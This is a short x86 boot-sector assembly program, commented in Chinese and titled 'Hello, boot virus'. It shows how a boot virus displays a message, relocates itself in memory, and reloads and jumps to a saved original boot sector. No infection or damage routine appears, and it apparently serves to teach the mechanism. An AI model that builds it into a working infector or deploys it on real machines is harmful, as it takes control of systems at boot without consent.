org	07c00h
times 	03eh db	0 ;let the code start after boot record, boot record size is 62 or 3eh
;在代码开始前填写占位字节0x3e个，这样对于绝对地址的寻址就不会变动（比如打印的message地址)
	mov	ax, cs
	mov	ds, ax
	mov	es, ax
	call	DispStr			; 调用显示字符串例程
	jmp ResumeSysBoot	
DispStr:
	mov	ax, BootMessage
	mov	bp, ax			; ES:BP = 串地址
	mov	cx, 16			; CX = 串长度
	mov	ax, 01301h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
	mov	dl, 0
	int	10h			; 10h 号中断
	ret
BootMessage:		db	"Hello, boot virus"

ResumeSysBoot:

mov ax, [SectorNo];获取保存1扇区的扇区号，感染时填写（在扇区结尾
;55 aa之前），此处为了简单写死了，约定的第一个用户扇区，即簇2，
;33号扇区
push ax;保存此扇区号，后面会pop出来使用

; move virus code to next memory 7e00h = $$ + 0200h
;des di, src si, count cx
mov di, $$ + 0200h
mov si, MovedCode
mov cx, movedcount

memove:;此处的代码将copy代码拷贝到7e00处
mov al, [si]
mov  [di], al
inc di
inc si
dec cx
jnz memove
jmp $$ + 0200h; jmp to movedcode which copied to 7c00 + 200h

MovedCode:;此处的代码要加载老扇区内容，所以被拷贝到7e00处去执行
xor ah, ah ; reset drive
xor dl, dl
int 13h

pop ax;要读的绝对扇区号，前面一开始压栈的
mov cl, 1;读一个扇区
mov bx, $$;读到7c00h处
call ReadSector;调用绝对扇区读函数
mov ax, $$
jmp ax; 跳到恢复的扇区内容去执行,不要直接用jmp $$因为这会用相对偏移，而代码搬迁后，这个偏移需要修订。


ReadSector:;该函数的绝对扇区号是从0开始的
;ax SectorNO, cl num , bx buf
mov bp, sp
sub sp, 2
push bx
mov byte [bp - 2], cl
mov bl, 18
div bl
inc ah; sectorno
mov cl, ah; set sectorno
mov dh, al
and dh, 1; hdr
shr al, 1; trackno track在磁盘文件上是按同trackno的所有磁头的连续存放，
;因为软盘2磁头，所以除以2
mov ch, al;set track no 
mov dl, 0; drive 0
pop bx
mov ah, 02h; read
mov al, [bp - 2]; read [bp-2] sectors
int 13h
add sp, 2
ret
;将保存扇区号的变量放到ret指令后，并删除填充的部分，使得该代码大小不会是512.
movedcount equ $ - MovedCode
SectorNo dw 33
